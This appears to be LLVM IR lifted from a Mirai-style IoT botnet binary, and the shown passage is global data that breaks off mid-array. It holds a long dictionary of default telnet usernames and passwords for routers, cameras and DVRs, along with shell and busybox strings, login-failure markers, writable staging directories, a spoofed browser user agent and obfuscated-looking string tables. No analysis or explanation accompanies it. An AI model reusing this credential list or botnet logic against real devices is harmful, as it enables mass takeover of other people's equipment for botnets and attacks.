source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_100000a4.1 = constant i32 1208024201
@global_var_10023960.3 = global i32 0
@global_var_1002396c.4 = local_unnamed_addr global i32* @global_var_10023960.3
@global_var_10010000.5 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_10024aa8.8 = global i32 0
@global_var_10023964.9 = global i32 0
@global_var_10024ac0.10 = global i32 0
@global_var_10024ac4.11 = local_unnamed_addr global i32 0
@global_var_10024ac8.12 = local_unnamed_addr global i32 0
@global_var_100246a8.13 = local_unnamed_addr global i32 4095
@global_var_100246a4.14 = local_unnamed_addr global i32 362436
@global_var_10011840.15 = constant [7 x i8] c"(null)\00"
@global_var_10024a44.16 = local_unnamed_addr global i32 0
@global_var_100013c0.17 = constant i32 1207985153
@global_var_1000140c.18 = constant i32 939589631
@global_var_10001460.19 = constant i32 1207959608
@global_var_10011848.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_10011850.21 = constant [3 x i8] c"sh\00"
@global_var_10011854.22 = constant [3 x i8] c"-c\00"
@global_var_100014c0.23 = constant [3 x i8] c"8`\00"
@global_var_100014f0.24 = constant i32 1207959576
@global_var_10011858.25 = constant i32 -1
@global_var_10001c38.26 = constant i32 939524126
@global_var_10024a20.27 = local_unnamed_addr global i32 0
@global_var_10011c58.28 = constant [5 x i8] c"PING\00"
@global_var_10001d34.29 = constant i32 939524126
@global_var_10011830.30 = constant [8 x i8] c"busybox\00"
@global_var_10011838.31 = constant i32 603979776
@global_var_1001183c.32 = constant i32 587202560
@global_var_10024668.33 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10011830.30, i32 0, i32 0), i8* bitcast (i32* @global_var_10011838.31 to i8*), i8* bitcast (i32* @global_var_1001183c.32 to i8*)]
@global_var_100117f8.34 = constant [7 x i8] c"nvalid\00"
@global_var_10011800.35 = constant [6 x i8] c"ailed\00"
@global_var_10011808.36 = constant [9 x i8] c"ncorrect\00"
@global_var_10011814.37 = constant [6 x i8] c"enied\00"
@global_var_1001181c.38 = constant [5 x i8] c"rror\00"
@global_var_10011824.39 = constant [7 x i8] c"oodbye\00"
@global_var_1001182c.40 = constant [4 x i8] c"bad\00"
@global_var_10024648.41 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100117f8.34, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011800.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011808.36, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011814.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001181c.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011824.39, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001182c.40, i32 0, i32 0)]
@global_var_100024b0.42 = constant i32 939524098
@global_var_100026b8.43 = constant i32 939524097
@global_var_10024a28.44 = global i32 0
@global_var_10024a2c.45 = local_unnamed_addr global i32 0
@global_var_10024a54.46 = local_unnamed_addr global i32 0
@global_var_10002a30.47 = constant i32 939524096
@global_var_10011c60.48 = constant [6 x i8] c":>%$#\00"
@global_var_10011c68.53 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_10024a48.54 = local_unnamed_addr global i32 0
@global_var_10003868.55 = constant i32 939524096
@global_var_10003a28.56 = constant i32 939524098
@global_var_10003ae4.57 = constant i32 939524096
@global_var_1001177c.58 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1001178c.59 = constant [6 x i8] c"/tmp/\00"
@global_var_10011794.60 = constant [6 x i8] c"/var/\00"
@global_var_1001179c.61 = constant [6 x i8] c"/dev/\00"
@global_var_100117a4.62 = constant [10 x i8] c"/var/run/\00"
@global_var_100117b0.63 = constant [10 x i8] c"/dev/shm/\00"
@global_var_100117bc.64 = constant [6 x i8] c"/mnt/\00"
@global_var_100117c4.65 = constant [7 x i8] c"/boot/\00"
@global_var_100117cc.66 = constant [6 x i8] c"/usr/\00"
@global_var_100117d4.67 = constant [6 x i8] c"/opt/\00"
@global_var_10024608.68 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1001177c.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001178c.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011794.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001179c.61, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100117a4.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100117b0.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117bc.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100117c4.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117cc.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117d4.67, i32 0, i32 0)]
@global_var_10011ce8.69 = constant i32 -57476
@global_var_10003ef8.70 = constant i32 1207962236
@global_var_10003f18.71 = constant i32 1207962204
@global_var_10010c64.83 = constant [7 x i8] c"telnet\00"
@global_var_10010c6c.84 = constant [5 x i8] c"root\00"
@global_var_10010c74.85 = constant [8 x i8] c"default\00"
@global_var_10010c80.86 = constant [7 x i8] c"daemon\00"
@global_var_10010c88.87 = constant [8 x i8] c"support\00"
@global_var_10010c94.88 = constant i32 0
@global_var_10010c98.89 = constant [7 x i8] c"123456\00"
@global_var_10010ca0.90 = constant [7 x i8] c"Zte521\00"
@global_var_10010ca8.91 = constant [6 x i8] c"vizxv\00"
@global_var_10010cb0.92 = constant [8 x i8] c"support\00"
@global_var_10010cc0.93 = constant [6 x i8] c"admin\00"
@global_var_10010cc8.94 = constant [7 x i8] c"camera\00"
@global_var_10010cd0.95 = constant [5 x i8] c"1234\00"
@global_var_10010cd8.96 = constant [10 x i8] c"fliradmin\00"
@global_var_10010ce4.97 = constant [4 x i8] c"jvc\00"
@global_var_10010cec.98 = constant [8 x i8] c"meinsma\00"
@global_var_10010cf8.99 = constant [9 x i8] c"password\00"
@global_var_10010d04.100 = constant [11 x i8] c"supervisor\00"
@global_var_10010d10.101 = constant [9 x i8] c"backdoor\00"
@global_var_10010d1c.102 = constant [7 x i8] c"atc123\00"
@global_var_10010d24.103 = constant [7 x i8] c"ascend\00"
@global_var_10010d2c.104 = constant [11 x i8] c"epicrouter\00"
@global_var_10010d38.105 = constant [5 x i8] c"none\00"
@global_var_10010d40.106 = constant [9 x i8] c"1234User\00"
@global_var_10010d4c.107 = constant [12 x i8] c"5678Service\00"
@global_var_10010d5c.108 = constant [9 x i8] c"atlantis\00"
@global_var_10010d68.109 = constant [8 x i8] c"ROOT500\00"
@global_var_10010d74.110 = constant [7 x i8] c"xxyyzz\00"
@global_var_10010d7c.111 = constant [7 x i8] c"danger\00"
@global_var_10010d84.112 = constant [7 x i8] c"crftpw\00"
@global_var_10010d8c.113 = constant [7 x i8] c"cms500\00"
@global_var_10010d94.114 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_10010da4.115 = constant [8 x i8] c"tslinux\00"
@global_var_10010db0.116 = constant [5 x i8] c"pass\00"
@global_var_10010db8.117 = constant [7 x i8] c"NetICs\00"
@global_var_10010dc0.118 = constant [9 x i8] c"security\00"
@global_var_10010dcc.119 = constant [7 x i8] c"friend\00"
@global_var_10010dd4.120 = constant [8 x i8] c"manager\00"
@global_var_10010de0.121 = constant [7 x i8] c"bintec\00"
@global_var_10010de8.122 = constant [8 x i8] c"articon\00"
@global_var_10010df4.123 = constant [7 x i8] c"patrol\00"
@global_var_10010dfc.124 = constant [8 x i8] c"service\00"
@global_var_10010e08.125 = constant [5 x i8] c"tech\00"
@global_var_10010e10.126 = constant [5 x i8] c"live\00"
@global_var_10010e18.127 = constant [7 x i8] c"Master\00"
@global_var_10010e20.128 = constant [7 x i8] c"laflaf\00"
@global_var_10010e28.129 = constant [9 x i8] c"Helpdesk\00"
@global_var_10010e34.130 = constant [6 x i8] c"Super\00"
@global_var_10010e3c.131 = constant [10 x i8] c"installer\00"
@global_var_10010e48.132 = constant [9 x i8] c"fivranne\00"
@global_var_10010e54.133 = constant [9 x i8] c"webadmin\00"
@global_var_10010e60.134 = constant [9 x i8] c"Serv4EMC\00"
@global_var_10010e6c.135 = constant [7 x i8] c"access\00"
@global_var_10010e74.136 = constant [9 x i8] c"netadmin\00"
@global_var_10010e80.137 = constant [9 x i8] c"mediator\00"
@global_var_10010e8c.138 = constant [8 x i8] c"Mau'dib\00"
@global_var_10010e98.139 = constant [7 x i8] c"cellit\00"
@global_var_10010ea0.140 = constant [8 x i8] c"diamond\00"
@global_var_10010eac.141 = constant [10 x i8] c"1234admin\00"
@global_var_10010eb8.142 = constant [9 x i8] c"changeme\00"
@global_var_10010ec4.143 = constant [7 x i8] c"attack\00"
@global_var_10010ecc.144 = constant [7 x i8] c"cmaker\00"
@global_var_10010ed4.145 = constant [18 x i8] c"changeme2database\00"
@global_var_10010ee8.146 = constant [5 x i8] c"NULL\00"
@global_var_10010ef0.147 = constant [6 x i8] c"Cisco\00"
@global_var_10010ef8.148 = constant [6 x i8] c"cisco\00"
@global_var_10010f00.149 = constant [8 x i8] c"blender\00"
@global_var_10010f0c.150 = constant [7 x i8] c"hsasdb\00"
@global_var_10010f14.151 = constant [7 x i8] c"wlsedb\00"
@global_var_10010f1c.152 = constant [13 x i8] c"wlsepassword\00"
@global_var_10010f2c.153 = constant [7 x i8] c"system\00"
@global_var_10010f34.154 = constant [8 x i8] c"cgadmin\00"
@global_var_10010f40.155 = constant [5 x i8] c"surt\00"
@global_var_10010f48.156 = constant [5 x i8] c"tini\00"
@global_var_10010f50.157 = constant [5 x i8] c"any@\00"
@global_var_10010f58.158 = constant [6 x i8] c"davox\00"
@global_var_10010f60.159 = constant [7 x i8] c"calvin\00"
@global_var_10010f68.160 = constant [10 x i8] c"my_DEMARC\00"
@global_var_10010f74.161 = constant [8 x i8] c"MServer\00"
@global_var_10010f80.162 = constant [4 x i8] c"PBX\00"
@global_var_10010f88.163 = constant [8 x i8] c"NETWORK\00"
@global_var_10010f94.164 = constant [7 x i8] c"BRIDGE\00"
@global_var_10010f9c.165 = constant [14 x i8] c"michaelangelo\00"
@global_var_10010fac.166 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_10010fbc.167 = constant [9 x i8] c"firmware\00"
@global_var_10010fc8.168 = constant [10 x i8] c"1234Admin\00"
@global_var_10010fd4.169 = constant [11 x i8] c"software01\00"
@global_var_10010fe0.170 = constant [15 x i8] c"Administration\00"
@global_var_10010ff0.171 = constant [8 x i8] c"su@psir\00"
@global_var_10010ffc.172 = constant [8 x i8] c"4getme2\00"
@global_var_10011008.173 = constant [9 x i8] c"tiger123\00"
@global_var_10011014.174 = constant [5 x i8] c"help\00"
@global_var_1001101c.175 = constant [10 x i8] c"extendnet\00"
@global_var_10011028.176 = constant [8 x i8] c"Exabyte\00"
@global_var_10011034.177 = constant [9 x i8] c"Posterie\00"
@global_var_10011040.178 = constant [8 x i8] c"!manage\00"
@global_var_1001104c.179 = constant [7 x i8] c"radius\00"
@global_var_10011054.180 = constant [9 x i8] c"nimdaten\00"
@global_var_10011060.181 = constant [5 x i8] c"isee\00"
@global_var_10011068.182 = constant [11 x i8] c"56789Admin\00"
@global_var_10011074.183 = constant [11 x i8] c"specialist\00"
@global_var_10011080.184 = constant [7 x i8] c"public\00"
@global_var_10011088.185 = constant [7 x i8] c"secret\00"
@global_var_10011090.186 = constant [7 x i8] c"abc123\00"
@global_var_10011098.187 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_100110a4.188 = constant [8 x i8] c"iDirect\00"
@global_var_100110b0.189 = constant [6 x i8] c"pilou\00"
@global_var_100110b8.190 = constant [6 x i8] c"setup\00"
@global_var_100110c0.191 = constant [6 x i8] c"hello\00"
@global_var_100110c8.192 = constant [9 x i8] c"adslroot\00"
@global_var_100110d4.193 = constant [14 x i8] c"administrator\00"
@global_var_100110e4.194 = constant [14 x i8] c"Administrator\00"
@global_var_100110f4.195 = constant [7 x i8] c"0Admin\00"
@global_var_100110fc.196 = constant [9 x i8] c"123Admin\00"
@global_var_10011108.197 = constant [12 x i8] c"123456Admin\00"
@global_var_10011118.198 = constant [14 x i8] c"123456special\00"
@global_var_10011128.199 = constant [10 x i8] c"superuser\00"
@global_var_10011134.200 = constant [8 x i8] c"admin00\00"
@global_var_10011140.201 = constant [8 x i8] c"orion99\00"
@global_var_1001114c.202 = constant [8 x i8] c"tivonpw\00"
@global_var_10011158.203 = constant [7 x i8] c"Ascend\00"
@global_var_10011160.204 = constant [6 x i8] c"super\00"
@global_var_10011168.205 = constant [12 x i8] c"lucenttech1\00"
@global_var_10011178.206 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_10011188.207 = constant [6 x i8] c"smile\00"
@global_var_10011190.208 = constant [7 x i8] c"router\00"
@global_var_10011198.209 = constant [9 x i8] c"motorola\00"
@global_var_100111a4.210 = constant [7 x i8] c"sysadm\00"
@global_var_100111ac.211 = constant [7 x i8] c"NetVCR\00"
@global_var_100111b4.212 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_100111c0.213 = constant [5 x i8] c"4tas\00"
@global_var_100111c8.214 = constant [6 x i8] c"maint\00"
@global_var_100111d0.215 = constant [6 x i8] c"m1122\00"
@global_var_100111d8.216 = constant [8 x i8] c"3ep5w2u\00"
@global_var_100111e4.217 = constant [9 x i8] c"ntacdmax\00"
@global_var_100111f0.218 = constant [9 x i8] c"PlsChgMe\00"
@global_var_100111fc.219 = constant [8 x i8] c"private\00"
@global_var_10011208.220 = constant [14 x i8] c"smallbusiness\00"
@global_var_10011218.221 = constant [3 x i8] c"mu\00"
@global_var_1001121c.222 = constant [14 x i8] c"microbusiness\00"
@global_var_1001122c.223 = constant [8 x i8] c"pfsense\00"
@global_var_10011238.224 = constant [8 x i8] c"hawk201\00"
@global_var_10011244.225 = constant [8 x i8] c"h179350\00"
@global_var_10011250.226 = constant [3 x i8] c"lp\00"
@global_var_10011254.227 = constant [8 x i8] c"radware\00"
@global_var_10011260.228 = constant [9 x i8] c"trancell\00"
@global_var_1001126c.229 = constant [10 x i8] c"Col2ogro2\00"
@global_var_10011278.230 = constant [9 x i8] c"p1nacate\00"
@global_var_10011284.231 = constant [7 x i8] c"col1ma\00"
@global_var_1001128c.232 = constant [10 x i8] c"d1scovery\00"
@global_var_10011298.233 = constant [6 x i8] c"w2402\00"
@global_var_100112a0.234 = constant [6 x i8] c"Sharp\00"
@global_var_100112a8.235 = constant [9 x i8] c"engineer\00"
@global_var_100112b4.236 = constant [8 x i8] c"ganteng\00"
@global_var_100112c0.237 = constant [9 x i8] c"smcadmin\00"
@global_var_100112cc.238 = constant [10 x i8] c"barricade\00"
@global_var_100112d8.239 = constant [10 x i8] c"highspeed\00"
@global_var_100112e4.240 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_100112f4.241 = constant [11 x i8] c"stratauser\00"
@global_var_10011300.242 = constant [6 x i8] c"Admin\00"
@global_var_10011308.243 = constant [8 x i8] c"mysweex\00"
@global_var_10011314.244 = constant [7 x i8] c"symbol\00"
@global_var_1001131c.245 = constant [8 x i8] c"mercury\00"
@global_var_10011328.246 = constant [9 x i8] c"truetime\00"
@global_var_10011334.247 = constant [11 x i8] c"12345Admin\00"
@global_var_10011340.248 = constant [7 x i8] c"master\00"
@global_var_10011348.249 = constant [5 x i8] c"xbox\00"
@global_var_10011350.250 = constant [10 x i8] c"tellabs#1\00"
@global_var_1001135c.251 = constant [8 x i8] c"admin_1\00"
@global_var_10011368.252 = constant [7 x i8] c"talent\00"
@global_var_10011370.253 = constant [8 x i8] c"imss7.0\00"
@global_var_1001137c.254 = constant [8 x i8] c"detmond\00"
@global_var_10011388.255 = constant [10 x i8] c"1111Admin\00"
@global_var_10011394.256 = constant [11 x i8] c"22222Admin\00"
@global_var_100113a0.257 = constant [8 x i8] c"x-admin\00"
@global_var_100113ac.258 = constant [7 x i8] c"switch\00"
@global_var_100113b4.259 = constant [9 x i8] c"zoomadsl\00"
@global_var_100113c0.260 = constant [9 x i8] c"expert03\00"
@global_var_100113cc.261 = constant [5 x i8] c"anko\00"
@global_var_100113d4.262 = constant [11 x i8] c"oelinux123\00"
@global_var_100113e0.263 = constant [7 x i8] c"alpine\00"
@global_var_100113e8.264 = constant [8 x i8] c"maxided\00"
@global_var_100113f4.265 = constant [10 x i8] c"raspberry\00"
@global_var_10011400.266 = constant [8 x i8] c"vagrant\00"
@global_var_1001140c.267 = constant [6 x i8] c"zlxx.\00"
@global_var_10011414.268 = constant [9 x i8] c"juantech\00"
@global_var_10011420.269 = constant [7 x i8] c"avtech\00"
@global_var_10011428.270 = constant [7 x i8] c"xc3511\00"
@global_var_10011430.271 = constant [7 x i8] c"666666\00"
@global_var_10011438.272 = constant [7 x i8] c"888888\00"
@global_var_10011440.273 = constant [7 x i8] c"111111\00"
@global_var_10011448.274 = constant [9 x i8] c"bayandsl\00"
@global_var_10011454.275 = constant [12 x i8] c"12345676890\00"
@global_var_10011464.276 = constant [11 x i8] c"1234567890\00"
@global_var_10011470.277 = constant [13 x i8] c"admintelecom\00"
@global_var_10011480.278 = constant [13 x i8] c"telecomadmin\00"
@global_var_10011490.279 = constant [7 x i8] c"comcom\00"
@global_var_10011498.280 = constant [8 x i8] c"zte9x15\00"
@global_var_100114a4.281 = constant [6 x i8] c"ZXDSL\00"
@global_var_100114ac.282 = constant [7 x i8] c"D-Link\00"
@global_var_100114b4.283 = constant [6 x i8] c"dlink\00"
@global_var_100114bc.284 = constant [6 x i8] c"DLink\00"
@global_var_100114c4.285 = constant [12 x i8] c"asteriskftp\00"
@global_var_100114d4.286 = constant [9 x i8] c"dreambox\00"
@global_var_100114e0.287 = constant [5 x i8] c"1111\00"
@global_var_100114e8.288 = constant [6 x i8] c"12345\00"
@global_var_100114f0.289 = constant [6 x i8] c"54321\00"
@global_var_100114f8.290 = constant [7 x i8] c"fucker\00"
@global_var_10011500.291 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_10011510.292 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_10011520.293 = constant [7 x i8] c"hi3518\00"
@global_var_10011528.294 = constant [7 x i8] c"klv123\00"
@global_var_10011530.295 = constant [8 x i8] c"klv1234\00"
@global_var_1001153c.296 = constant [8 x i8] c"realtek\00"
@global_var_10011548.297 = constant [6 x i8] c"jvbzd\00"
@global_var_10011550.298 = constant [8 x i8] c"xmhdipc\00"
@global_var_1001155c.299 = constant [9 x i8] c"openlgtv\00"
@global_var_10011568.300 = constant [8 x i8] c"root123\00"
@global_var_10011574.301 = constant [9 x i8] c"ahetzip8\00"
@global_var_10011580.302 = constant [7 x i8] c"696969\00"
@global_var_10011588.303 = constant [9 x i8] c"pa55w0rd\00"
@global_var_10011594.304 = constant [7 x i8] c"123123\00"
@global_var_1001159c.305 = constant [9 x i8] c"b120root\00"
@global_var_100115a8.306 = constant [9 x i8] c"PASSWORD\00"
@global_var_100115b4.307 = constant [6 x i8] c"ADMIN\00"
@global_var_100115bc.308 = constant [8 x i8] c"netgear\00"
@global_var_100115c8.309 = constant [7 x i8] c"vyatta\00"
@global_var_100115d0.310 = constant [7 x i8] c"atc456\00"
@global_var_100115d8.311 = constant [7 x i8] c"micros\00"
@global_var_100115e0.312 = constant [8 x i8] c"comcast\00"
@global_var_100115ec.313 = constant [4 x i8] c"pos\00"
@global_var_100115f4.314 = constant [4 x i8] c"www\00"
@global_var_100115fc.315 = constant [5 x i8] c"2800\00"
@global_var_10011604.316 = constant [5 x i8] c"UBNT\00"
@global_var_1001160c.317 = constant [9 x i8] c"00000000\00"
@global_var_10011618.318 = constant [5 x i8] c"user\00"
@global_var_10011620.319 = constant [5 x i8] c"ikwb\00"
@global_var_10011628.320 = constant [5 x i8] c"ubnt\00"
@global_var_10011630.321 = constant [4 x i8] c"buh\00"
@global_var_10011638.322 = constant [7 x i8] c"utstar\00"
@global_var_10011640.323 = constant [9 x i8] c"99999999\00"
@global_var_1001164c.324 = constant [6 x i8] c"Meins\00"
@global_var_10011654.325 = constant [4 x i8] c"JVC\00"
@global_var_1001165c.326 = constant [5 x i8] c"ip20\00"
@global_var_10011664.327 = constant [7 x i8] c"ip3000\00"
@global_var_1001166c.328 = constant [6 x i8] c"ip400\00"
@global_var_10011674.329 = constant [8 x i8] c"tsunami\00"
@global_var_10011680.330 = constant [7 x i8] c"2601hx\00"
@global_var_10011688.331 = constant [7 x i8] c"synnet\00"
@global_var_10011690.332 = constant [6 x i8] c"quser\00"
@global_var_10011698.333 = constant [8 x i8] c"Manager\00"
@global_var_100116a4.334 = constant [8 x i8] c"netopia\00"
@global_var_100116b0.335 = constant [8 x i8] c"anicust\00"
@global_var_100116bc.336 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_100116c8.337 = constant [5 x i8] c"echo\00"
@global_var_100116d0.338 = constant [5 x i8] c"demo\00"
@global_var_100116d8.339 = constant [7 x i8] c"client\00"
@global_var_100116e0.340 = constant [6 x i8] c"CISCO\00"
@global_var_100116e8.341 = constant [8 x i8] c"7654321\00"
@global_var_100116f4.342 = constant [9 x i8] c"adsl1234\00"
@global_var_10011700.343 = constant [5 x i8] c"toor\00"
@global_var_10011708.344 = constant [9 x i8] c"adminttd\00"
@global_var_10011714.345 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_10011720.346 = constant [9 x i8] c"11111111\00"
@global_var_1001172c.347 = constant [9 x i8] c"22222222\00"
@global_var_10011738.348 = constant [9 x i8] c"mountsys\00"
@global_var_10011744.349 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_10011754.350 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_10011764.351 = constant [11 x i8] c"Muse!Admin\00"
@global_var_10011770.352 = constant [10 x i8] c"changeme2\00"
@global_var_10011d08.377 = constant [6 x i8] c"arfgG\00"
@global_var_10011d10.378 = constant [9 x i8] c"HBiug655\00"
@global_var_10011d1c.379 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_10011d2c.380 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_10011d40.381 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10011d54.382 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10011d60.383 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10011d6c.384 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_10011d78.385 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10011d84.386 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10011d90.387 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10011da0.388 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_10011dac.389 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_10011dbc.390 = constant [9 x i8] c"ewqdcftr\00"
@global_var_10011dc8.391 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_10011dd8.392 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10011de4.393 = constant [12 x i8] c"twehgbferhb\00"
@global_var_10011df0.394 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_10011dfc.395 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_10011e0c.396 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_10011e1c.397 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_10011e2c.398 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_10011e38.399 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_10011e48.400 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_10011e58.401 = constant [12 x i8] c"yteytietyue\00"
@global_var_10011e64.402 = constant [9 x i8] c"qsortEQS\00"
@global_var_10011e70.403 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10011e80.404 = constant [4 x i8] c"std\00"
@global_var_10011e84.405 = constant [4 x i8] c"dts\00"
@global_var_10011e88.406 = constant [4 x i8] c"lsk\00"
@global_var_10011e8c.407 = constant [4 x i8] c"kek\00"
@global_var_10011e90.408 = constant [6 x i8] c"smack\00"
@global_var_10011e98.409 = constant [4 x i8] c"ily\00"
@global_var_10011e9c.410 = constant [4 x i8] c"tyf\00"
@global_var_10011ea0.411 = constant [4 x i8] c"pos\00"
@global_var_10011ea4.412 = constant [6 x i8] c"cunts\00"
@global_var_10011eac.413 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011d08.377, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011d10.378, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011d1c.379, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10011d2c.380, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10011d40.381, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011d54.382, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011d60.383, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011d6c.384, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10011d78.385, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011d84.386, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011d90.387, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011da0.388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011dac.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011dbc.390, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10011dc8.391, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011dd8.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011de4.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011df0.394, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011dfc.395, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e0c.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e1c.397, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10011e2c.398, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e38.399, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e48.400, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011e58.401, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011e64.402, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10011e70.403, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e80.404, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e84.405, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e88.406, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e8c.407, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011e90.408, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e98.409, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011e9c.410, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ea0.411, i32 0, i32 0), i8* getelementptr inbounds ([6 